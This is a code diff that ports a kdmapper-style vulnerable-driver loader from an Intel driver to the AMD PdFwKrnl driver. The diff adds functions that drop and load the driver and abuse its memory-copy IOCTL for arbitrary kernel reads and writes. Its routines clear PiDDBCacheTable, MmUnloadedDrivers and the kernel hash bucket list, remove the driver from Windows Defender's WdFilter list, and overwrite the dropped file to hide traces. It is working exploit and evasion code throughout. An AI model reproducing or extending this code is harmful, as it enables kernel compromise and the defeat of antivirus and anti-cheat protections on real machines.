@@ -1,10 +1,10 @@
-#include "intel_driver.hpp"
+#include "amd_driver.hpp"
 #include <Windows.h>
 #include <string>
 #include <fstream>
 
 #include "utils.hpp"
-#include "intel_driver_resource.hpp"
+#include "amd_driver_resource.hpp"
 #include "service.hpp"
 #include "nt.hpp"
 #include "portable_executable.hpp"
@@ -13,63 +13,32 @@
 #include "KDSymbolsHandler.h"
 #endif
 
-/**
- Command structures
-*/
-typedef struct _COPY_MEMORY_BUFFER_INFO
+// AMD PdFwKrnl request layout (KDU Source/Hamakaze/idrv/amd.h).
+// The driver copies Size bytes from Source to Destination; the copy is backed
+// by MmGetPhysicalAddress + MmMapIoSpace inside the driver, so it reaches any
+// kernel or caller-process address and ignores virtual page protection.
+#pragma pack(push, 1)
+typedef struct _PDFW_MEMCPY_REQUEST
 {
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t source;
-	uint64_t destination;
-	uint64_t length;
-}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;
+	uint8_t  Reserved[16];
+	uint64_t Destination;
+	uint64_t Source;
+	uint64_t Reserved2;
+	uint32_t Size;
+	uint32_t Reserved3;
+} PDFW_MEMCPY_REQUEST, *PPDFW_MEMCPY_REQUEST;
+#pragma pack(pop)
 
-typedef struct _FILL_MEMORY_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved1;
-	uint32_t value;
-	uint32_t reserved2;
-	uint64_t destination;
-	uint64_t length;
-}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;
-
-typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t return_physical_address;
-	uint64_t address_to_translate;
-}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;
-
-typedef struct _MAP_IO_SPACE_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved;
-	uint64_t return_value;
-	uint64_t return_virtual_address;
-	uint64_t physical_address_to_map;
-	uint32_t size;
-}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;
-
-typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
-{
-	uint64_t case_number;
-	uint64_t reserved1;
-	uint64_t reserved2;
-	uint64_t virt_address;
-	uint64_t reserved3;
-	uint32_t number_of_bytes;
-}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;
-
-// End Command structures
-
-HANDLE intel_driver::hDevice = 0;
-ULONG64 intel_driver::ntoskrnlAddr = 0;
+HANDLE amd_driver::hDevice = 0;
+ULONG64 amd_driver::ntoskrnlAddr = 0;
 std::string cachedDriverName = "";
 
-std::wstring intel_driver::GetDriverNameW() {
+// True when this process performed the NtLoadDriver (and thus owns the
+// randomly-named service + temp file). False when we attached to a PdFwKrnl
+// that was already loaded — then Unload must leave the system untouched.
+static bool g_we_loaded_driver = false;
+
+std::wstring amd_driver::GetDriverNameW() {
 	if (cachedDriverName.empty()) {
 		//Create a random name
 		char buffer[100]{};
@@ -86,7 +55,7 @@ std::wstring intel_driver::GetDriverNameW() {
 	return name;
 }
 
-std::wstring intel_driver::GetDriverPath() {
+std::wstring amd_driver::GetDriverPath() {
 	std::wstring temp = kdmUtils::GetFullTempPath();
 	if (temp.empty()) {
 		return L"";
@@ -94,8 +63,8 @@ std::wstring intel_driver::GetDriverPath() {
 	return temp + L"\\" + GetDriverNameW();
 }
 
-bool intel_driver::IsRunning() {
-	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+bool amd_driver::IsRunning() {
+	const HANDLE file_handle = CreateFileW(L"\\\\.\\PdFwKrnl", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(file_handle);
@@ -105,7 +74,7 @@ bool intel_driver::IsRunning() {
 }
 
 //get Se debug privilege
-NTSTATUS intel_driver::AcquireDebugPrivilege() {
+NTSTATUS amd_driver::AcquireDebugPrivilege() {
 
 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 	if (ntdll == NULL) {
@@ -121,16 +90,33 @@ NTSTATUS intel_driver::AcquireDebugPrivilege() {
 	return Status;
 }
 
-NTSTATUS intel_driver::Load() {
+NTSTATUS amd_driver::Load() {
 	srand((unsigned)time(NULL) * GetCurrentThreadId());
 
-	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
-	if (intel_driver::IsRunning()) {
-		kdmLog(L"[-] \\Device\\Nal is already in use." << std::endl);
-		kdmLog(L"[-] This means that there is a intel driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver." << std::endl);
-		kdmLog(L"[-] If you are sure that there is no other instance of kdmapper running, you can try to restart your computer to fix this issue." << std::endl);
-		kdmLog(L"[-] If the problem persists, you can try to unload the intel driver manually (If the driver was loaded with kdmapper will have a random name and will be located in %temp%), if not, the driver name is iqvw64e.sys." << std::endl);
-		return STATUS_ALREADY_REGISTERED;
+	// If PdFwKrnl is already present (real AMD software or a leftover copy from
+	// a crashed run), reuse it: no file drop, no service, nothing to clean up.
+	if (amd_driver::IsRunning()) {
+		hDevice = CreateFileW(L"\\\\.\\PdFwKrnl", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
+			g_we_loaded_driver = false;
+			ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
+			if (ntoskrnlAddr == 0) {
+				kdmLog(L"[-] Failed to get ntoskrnl.exe" << std::endl);
+				CloseHandle(hDevice);
+				hDevice = 0;
+				return STATUS_BAD_DLL_ENTRYPOINT;
+			}
+			IMAGE_DOS_HEADER dosHeader = { 0 };
+			if (!amd_driver::ReadMemory(amd_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+				kdmLog(L"[-] Present PdFwKrnl did not answer, is there any antivirus or anticheat running?" << std::endl);
+				CloseHandle(hDevice);
+				hDevice = 0;
+				return STATUS_INVALID_IMAGE_FORMAT;
+			}
+			return STATUS_SUCCESS;
+		}
+		// Device object exists but we cannot open it: fall through and try a
+		// fresh load anyway (NtLoadDriver on the same image is idempotent).
 	}
 
 	kdmLog(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);
@@ -143,7 +129,7 @@ NTSTATUS intel_driver::Load() {
 
 	_wremove(driver_path.c_str());
 
-	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
+	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(amd_driver_resource::driver), sizeof(amd_driver_resource::driver))) {
 		kdmLog(L"[-] Failed to create vulnerable driver file" << std::endl);
 		return STATUS_DISK_OPERATION_FAILED;
 	}
@@ -162,58 +148,61 @@ NTSTATUS intel_driver::Load() {
 		return status;
 	}
 
-	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hDevice = CreateFileW(L"\\\\.\\PdFwKrnl", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
-		kdmLog(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
-		intel_driver::Unload();
+		kdmLog(L"[-] Failed to load driver PdFwKrnl.sys" << std::endl);
+		g_we_loaded_driver = true; // service exists even though open failed: unload must clean it
+		amd_driver::Unload();
 		return STATUS_NOT_FOUND;
 	}
+
+	g_we_loaded_driver = true;
 
 	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
 	if (ntoskrnlAddr == 0) {
 		kdmLog(L"[-] Failed to get ntoskrnl.exe" << std::endl);
-		intel_driver::Unload();
+		amd_driver::Unload();
 		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
 
 	//check MZ ntoskrnl.exe
 	IMAGE_DOS_HEADER dosHeader = { 0 };
-	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
-		kdmLog(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
-		intel_driver::Unload();
+	if (!amd_driver::ReadMemory(amd_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+		kdmLog(L"[-] Can't exploit amd driver, is there any antivirus or anticheat running?" << std::endl);
+		amd_driver::Unload();
 		return STATUS_INVALID_IMAGE_FORMAT;
 	}
 
-	if (!intel_driver::ClearPiDDBCacheTable()) {
+	if (!amd_driver::ClearPiDDBCacheTable()) {
 		kdmLog(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
-		intel_driver::Unload();
+		amd_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x1000; //add custom value to error code to identify specific fail
 	}
 
-	if (!intel_driver::ClearKernelHashBucketList()) {
+	if (!amd_driver::ClearKernelHashBucketList()) {
 		kdmLog(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
-		intel_driver::Unload();
+		amd_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x2000;
 	}
 
-	if (!intel_driver::ClearMmUnloadedDrivers()) {
+	if (!amd_driver::ClearMmUnloadedDrivers()) {
 		kdmLog(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
-		intel_driver::Unload();
+		amd_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x3000;
 	}
 
-	if (!intel_driver::ClearWdFilterDriverList()) {
+	if (!amd_driver::ClearWdFilterDriverList()) {
 		kdmLog("[!] Failed to ClearWdFilterDriverList" << std::endl);
-		intel_driver::Unload();
+		amd_driver::Unload();
 		return STATUS_DELETE_PENDING | 0x4000;
 	}
 
 	return STATUS_SUCCESS;
 }
 
-bool intel_driver::ClearWdFilterDriverList() {
+bool amd_driver::ClearWdFilterDriverList() {
 
 	auto WdFilter = kdmUtils::GetKernelModuleAddress("WdFilter.sys");
 	if (!WdFilter) {
@@ -308,7 +297,7 @@ bool intel_driver::ClearWdFilterDriverList() {
 		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
 			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
 			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
-				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
+				if (wcsstr(ImageName.get(), amd_driver::GetDriverNameW().c_str())) {
 
 					//remove from RuntimeDriversArray
 					bool removedRuntimeDriversArray = false;
@@ -363,12 +352,18 @@ bool intel_driver::ClearWdFilterDriverList() {
 	return false;
 }
 
-NTSTATUS intel_driver::Unload() {
+NTSTATUS amd_driver::Unload() {
 	kdmLog(L"[<] Unloading vulnerable driver" << std::endl);
 
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
 		CloseHandle(hDevice);
+		hDevice = 0;
 	}
+
+	// Attached to a pre-existing PdFwKrnl: nothing of ours exists on the
+	// system, so there is nothing to stop, remove or overwrite.
+	if (!g_we_loaded_driver)
+		return STATUS_SUCCESS;
 
 	auto status = service::StopAndRemove(GetDriverNameW());
 	if (!NT_SUCCESS(status))
@@ -383,7 +378,7 @@ NTSTATUS intel_driver::Unload() {
 		return STATUS_DELETE_PENDING;
 	}
 
-	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
+	int newFileLen = sizeof(amd_driver_resource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
 	BYTE* randomData = new BYTE[newFileLen];
 	for (size_t i = 0; i < newFileLen; i++) {
 		randomData[i] = (BYTE)(rand() % 255);
@@ -401,130 +396,80 @@ NTSTATUS intel_driver::Unload() {
 	if (_wremove(driver_path.c_str()) != 0)
 		return STATUS_DELETE_PENDING;
 
+	g_we_loaded_driver = false;
 	return STATUS_SUCCESS;
 }
 
-bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
+bool amd_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
 	if (!destination || !source || !size)
 		return 0;
 
-	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };
+	// 1 MB per IOCTL: large enough for section-sized pattern scans, small
+	// enough to stay clear of any driver-side transfer cap.
+	const uint64_t max_per_call = 0x100000;
+	uint64_t done = 0;
+	while (done < size) {
+		const uint64_t part = min(max_per_call, size - done);
 
-	copy_memory_buffer.case_number = 0x33;
-	copy_memory_buffer.source = source;
-	copy_memory_buffer.destination = destination;
-	copy_memory_buffer.length = size;
+		PDFW_MEMCPY_REQUEST req = { 0 };
+		req.Destination = destination + done;
+		req.Source = source + done;
+		req.Size = (uint32_t)part;
 
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
-}
+		DWORD bytes_returned = 0;
+		if (!DeviceIoControl(hDevice, ioctl_memcpy, &req, sizeof(req), &req, sizeof(req), &bytes_returned, nullptr))
+			return false;
 
-bool intel_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
-	if (!address || !size)
-		return 0;
-
-	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };
-
-	fill_memory_buffer.case_number = 0x30;
-	fill_memory_buffer.destination = address;
-	fill_memory_buffer.value = value;
-	fill_memory_buffer.length = size;
-
-	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
-}
-
-bool intel_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
-	if (!address)
-		return 0;
-
-	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };
-
-	get_phys_address_buffer.case_number = 0x25;
-	get_phys_address_buffer.address_to_translate = address;
-
-	DWORD bytes_returned = 0;
-
-	if (!DeviceIoControl(hDevice, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
-		return false;
-
-	*out_physical_address = get_phys_address_buffer.return_physical_address;
+		done += part;
+	}
 	return true;
 }
 
-uint64_t intel_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
-	if (!physical_address || !size)
-		return 0;
-
-	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };
-
-	map_io_space_buffer.case_number = 0x19;
-	map_io_space_buffer.physical_address_to_map = physical_address;
-	map_io_space_buffer.size = size;
-
-	DWORD bytes_returned = 0;
-
-	if (!DeviceIoControl(hDevice, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
-		return 0;
-
-	return map_io_space_buffer.return_virtual_address;
-}
-
-bool intel_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
+bool amd_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
 	if (!address || !size)
+		return 0;
+
+	// No fill IOCTL on this driver: emulate with a locally filled buffer.
+	const uint64_t buf_size = min(size, (uint64_t)0x10000);
+	uint8_t* pattern = (uint8_t*)VirtualAlloc(nullptr, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!pattern)
 		return false;
+	for (uint64_t i = 0; i + sizeof(uint32_t) <= buf_size; i += sizeof(uint32_t))
+		*(uint32_t*)(pattern + i) = value;
 
-	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };
-
-	unmap_io_space_buffer.case_number = 0x1A;
-	unmap_io_space_buffer.virt_address = address;
-	unmap_io_space_buffer.number_of_bytes = size;
-
-	DWORD bytes_returned = 0;
-
-	return DeviceIoControl(hDevice, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
-}
-
-bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
-	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
-}
-
-bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
-	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
-}
-
-bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
-	if (!address || !buffer || !size)
-		return false;
-
-	uint64_t physical_address = 0;
-
-	if (!GetPhysicalAddress(address, &physical_address)) {
-		kdmLog(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
-		return false;
+	bool result = true;
+	uint64_t done = 0;
+	while (done < size) {
+		const uint64_t part = min(buf_size, size - done);
+		if (!WriteMemory(address + done, pattern, part)) {
+			result = false;
+			break;
+		}
+		done += part;
 	}
-
-	const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);
-
-	if (!mapped_physical_memory) {
-		kdmLog(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
-		return false;
-	}
-
-	bool result = WriteMemory(mapped_physical_memory, buffer, size);
-
-#if defined(DISABLE_OUTPUT)
-	UnmapIoSpace(mapped_physical_memory, size);
-#else
-	if (!UnmapIoSpace(mapped_physical_memory, size))
-		kdmLog(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
-#endif
-
-
+	VirtualFree(pattern, 0, MEM_RELEASE);
 	return result;
 }
 
-uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
+bool amd_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
+	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
+}
+
+bool amd_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
+	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
+}
+
+bool amd_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
+	if (!address || !buffer || !size)
+		return false;
+
+	// The PdFwKrnl copy is backed by MmGetPhysicalAddress + MmMapIoSpace inside
+	// the driver, so a plain write already bypasses virtual page protection —
+	// no separate physical map step is needed like on the Intel backend.
+	return WriteMemory(address, buffer, size);
+}
+
+uint64_t amd_driver::MmAllocateIndependentPagesEx(uint32_t size)
 {
 	uint64_t allocated_pages{};
 
@@ -538,14 +483,14 @@ uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
 			kdmLog(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
 			return 0;
 		}
-		kernel_MmAllocateIndependentPagesEx += intel_driver::ntoskrnlAddr;
+		kernel_MmAllocateIndependentPagesEx += amd_driver::ntoskrnlAddr;
 	}
 #else
 	if (!kernel_MmAllocateIndependentPagesEx)
 	{
 		//Updated, tested from 1803 to 24H2
 		//KeAllocateInterrupt -> 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
-		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel((char*)".text", intel_driver::ntoskrnlAddr,
+		kernel_MmAllocateIndependentPagesEx = amd_driver::FindPatternInSectionAtKernel((char*)".text", amd_driver::ntoskrnlAddr,
 			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
 			(char*)"xxxxxxxxx????xxx");
 		if (!kernel_MmAllocateIndependentPagesEx) {
@@ -563,13 +508,13 @@ uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
 	}
 #endif
 
-	if (!intel_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
+	if (!amd_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
 		return 0;
 
 	return allocated_pages;
 }
 
-bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
+bool amd_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 {
 	static uint64_t kernel_MmFreeIndependentPages = 0;
 
@@ -581,9 +526,9 @@ bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 			kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
 			return false;
 		}
-		kernel_MmFreeIndependentPages += intel_driver::ntoskrnlAddr;
+		kernel_MmFreeIndependentPages += amd_driver::ntoskrnlAddr;
 #else
-		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
+		kernel_MmFreeIndependentPages = amd_driver::FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr,
 			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
 			(char*)"xxxxxxxxx????xxxxxxx");
 		if (!kernel_MmFreeIndependentPages) {
@@ -591,7 +536,7 @@ bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 			kdmLog(L"[+] Trying second pattern for MmFreeIndependentPages" << std::endl);
 
 			// Windows 11
-			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
+			kernel_MmFreeIndependentPages = amd_driver::FindPatternInSectionAtKernel("PAGE", amd_driver::ntoskrnlAddr,
 				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
 				(char*)"xx????xxxx????xxx");
 
@@ -615,10 +560,10 @@ bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 	}
 
 	uint64_t result{};
-	return intel_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
+	return amd_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
 }
 
-BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
+BOOLEAN amd_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
 {
 	if (!address)
 	{
@@ -636,17 +581,17 @@ BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG
 			kdmLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
 			return FALSE;
 		}
-		kernel_MmSetPageProtection += intel_driver::ntoskrnlAddr;
+		kernel_MmSetPageProtection += amd_driver::ntoskrnlAddr;
 #else
 		//Updated, tested from 1803 to 24H2
 		//  0F 45 ? ? 8D ? ? ? FF FF E8
 		//  0F 45 ? ? 45 8B ? ? ? ? 8D ? ? ? ? ? ? FF FF E8  (Some windows builds have a instruction in the middle)
-		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr, 
+		kernel_MmSetPageProtection = amd_driver::FindPatternInSectionAtKernel("PAGELK", amd_driver::ntoskrnlAddr, 
 			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
 			(char*)"xx??x???xxx");
 		if (!kernel_MmSetPageProtection) {
 
-			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
+			kernel_MmSetPageProtection = amd_driver::FindPatternInSectionAtKernel("PAGELK", amd_driver::ntoskrnlAddr,
 				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
 				(char*)"xx??xx????x???xxx");
 
@@ -670,17 +615,17 @@ BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG
 	}
 
 	BOOLEAN set_prot_status{};
-	if (!intel_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
+	if (!amd_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
 		return FALSE;
 
 	return set_prot_status;
 }
 
-uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
+uint64_t amd_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	if (!size)
 		return 0;
 
-	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
 
 	if (!kernel_ExAllocatePool) {
 		kdmLog(L"[!] Failed to find ExAllocatePool" << std::endl);
@@ -695,11 +640,11 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	return allocated_pool;
 }
 
-bool intel_driver::FreePool(uint64_t address) {
+bool amd_driver::FreePool(uint64_t address) {
 	if (!address)
 		return 0;
 
-	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExFreePool");
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "ExFreePool");
 
 	if (!kernel_ExFreePool) {
 		kdmLog(L"[!] Failed to find ExAllocatePool" << std::endl);
@@ -709,7 +654,7 @@ bool intel_driver::FreePool(uint64_t address) {
 	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
 }
 
-uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
+uint64_t amd_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
 	if (!kernel_module_base)
 		return 0;
 
@@ -765,7 +710,7 @@ uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const 
 	return 0;
 }
 
-bool intel_driver::ClearMmUnloadedDrivers() {
+bool amd_driver::ClearMmUnloadedDrivers() {
 	ULONG buffer_size = 0;
 	void* buffer = nullptr;
 
@@ -855,7 +800,7 @@ bool intel_driver::ClearMmUnloadedDrivers() {
 	return true;
 }
 
-PVOID intel_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
+PVOID amd_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
 	ULONG_PTR Instr = (ULONG_PTR)Instruction;
 	LONG RipOffset = 0;
 	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
@@ -865,11 +810,11 @@ PVOID intel_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG Of
 	return ResolvedAddr;
 }
 
-bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
+bool amd_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
 	if (!Resource)
 		return 0;
 
-	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
+	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
 
 	if (!kernel_ExAcquireResourceExclusiveLite) {
 		kdmLog(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
@@ -881,11 +826,11 @@ bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) 
 	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
 }
 
-bool intel_driver::ExReleaseResourceLite(PVOID Resource) {
+bool amd_driver::ExReleaseResourceLite(PVOID Resource) {
 	if (!Resource)
 		return false;
 
-	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");
+	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "ExReleaseResourceLite");
 
 	if (!kernel_ExReleaseResourceLite) {
 		kdmLog(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
@@ -895,11 +840,11 @@ bool intel_driver::ExReleaseResourceLite(PVOID Resource) {
 	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
 }
 
-BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
+BOOLEAN amd_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
 	if (!Table)
 		return false;
 
-	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
+	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
 
 	if (!kernel_RtlDeleteElementGenericTableAvl) {
 		kdmLog(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
@@ -910,11 +855,11 @@ BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer)
 	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
 }
 
